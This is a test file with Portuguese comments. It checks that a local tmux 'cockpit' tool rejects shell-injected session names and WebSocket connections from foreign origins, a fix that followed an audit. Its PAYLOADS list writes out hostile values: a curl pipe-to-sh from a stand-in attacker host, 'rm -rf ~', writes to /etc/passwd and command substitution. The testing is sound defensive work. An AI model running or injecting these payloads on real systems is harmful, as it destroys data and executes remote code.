/**
 * Testes adversariais das duas superfícies que recebem entrada não confiável
 * (2026-07-30, achado da auditoria do repo público).
 *
 * O contexto importa para quem ler isto depois: o cockpit escuta em loopback e
 * não tem autenticação. Isso NÃO o isola do navegador — WebSocket é isento de
 * same-origin policy, então qualquer página aberta numa aba podia abrir
 * `ws://127.0.0.1:4000/ws` e falar o protocolo. E `isCkptSession` validava só o
 * PREFIXO, de modo que `ckpt-x; comando; #` passava e era interpolado sem aspas
 * num comando de shell executado por SSH na VPS de produção.
 *
 * Nenhum destes testes abre socket real, SSH real ou toca em produção.
 */
import { describe, it, expect } from 'vitest';
import {
  isCkptSession,
  assertCkptSession,
  shellQuote,
  buildSessionName,
} from '../../src/tmux/session-name.js';
import { isAllowedOrigin } from '../../src/ws/index.js';

/** Cargas que um atacante mandaria pelo campo `sessionName` do protocolo. */
const PAYLOADS = [
  'ckpt-x; tmux kill-server; #',
  'ckpt-x && curl http://evil.example/s.sh | sh',
  'ckpt-x | tee /tmp/pwned',
  'ckpt-x`id`',
  'ckpt-x$(id)',
  'ckpt-x${HOME}',
  "ckpt-x'; rm -rf ~; '",
  'ckpt-x"; rm -rf ~; "',
  'ckpt-x\nrm -rf ~',
  'ckpt-x\r\nrm -rf ~',
  'ckpt-x >/etc/passwd',
  'ckpt-x <(id)',
  'ckpt-x; :',
  'ckpt-x*',
  'ckpt-x?',
  'ckpt-x ~',
  'ckpt-x\\; id',
  'ckpt-x\u0000id',
];

describe('allowlist de sessão — gramática, não só prefixo', () => {
  it.each(PAYLOADS)('recusa %j', (payload) => {
    expect(isCkptSession(payload)).toBe(false);
    expect(() => assertCkptSession(payload)).toThrow(/refusing to target/);
  });

  it('continua aceitando os nomes que o cockpit realmente produz', () => {
    for (const name of [
      'ckpt-acme-geral-1',
      'ckpt-acme-cor_por_atencao-12',
      'ckpt-projeto-com-hifens-no-meio-3',
      'ckpt-a',
    ]) {
      expect(isCkptSession(name)).toBe(true);
    }
    // E o que `buildSessionName` gera é aceito por construção.
    expect(isCkptSession(buildSessionName('Acme Corp!', 'Cor por Atenção', 7))).toBe(true);
  });

  it('mantém as recusas que já existiam antes da gramática', () => {
    for (const name of ['Ckpt-x', 'CKPT-x', ' ckpt-x', '\tckpt-x', 'xckpt-foo', 'ckpt-', '']) {
      expect(isCkptSession(name)).toBe(false);
    }
    for (const notAString of [null, undefined, 42, {}, [], ['ckpt-x']]) {
      expect(isCkptSession(notAString)).toBe(false);
    }
  });
});

describe('shellQuote — segunda camada', () => {
  it('torna inerte tudo que a gramática recusaria', () => {
    for (const payload of PAYLOADS) {
      const quoted = shellQuote(payload);
      // Começa e termina com aspa simples...
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      // ...e nenhuma aspa simples interna ficou sem escape, que é a única
      // forma de escapar de um literal em sh.
      const interior = quoted.slice(1, -1);
      expect(interior.replace(/'\\''/g, '')).not.toContain("'");
    }
  });

  it('preserva o valor original (não corrompe nomes legítimos)', () => {
    expect(shellQuote('ckpt-acme-geral-1')).toBe("'ckpt-acme-geral-1'");
  });
});

describe('origem do WebSocket', () => {
  const PORT = 4000;

  it('recusa páginas de qualquer site — o vetor do navegador', () => {
    for (const origin of [
      'https://evil.example',
      'http://evil.example',
      'https://blog-legitimo-comprometido.com',
      'http://localhost:4000.evil.example',
      'http://127.0.0.1:4000.evil.example',
      'https://127.0.0.1:4000',
      'http://localhost:4001',
      'null',
    ]) {
      expect(isAllowedOrigin(origin, PORT)).toBe(false);
    }
  });

  it('aceita a própria UI', () => {
    expect(isAllowedOrigin('http://localhost:4000', PORT)).toBe(true);
    expect(isAllowedOrigin('http://127.0.0.1:4000', PORT)).toBe(true);
    expect(isAllowedOrigin('http://[::1]:4000', PORT)).toBe(true);
  });

  it('aceita o dev server do Vite, que faz proxy de /ws', () => {
    expect(isAllowedOrigin('http://localhost:5173', PORT)).toBe(true);
  });

  it('aceita cliente sem Origin — não-navegador não é o vetor', () => {
    expect(isAllowedOrigin(undefined, PORT)).toBe(true);
    expect(isAllowedOrigin('', PORT)).toBe(true);
  });
});
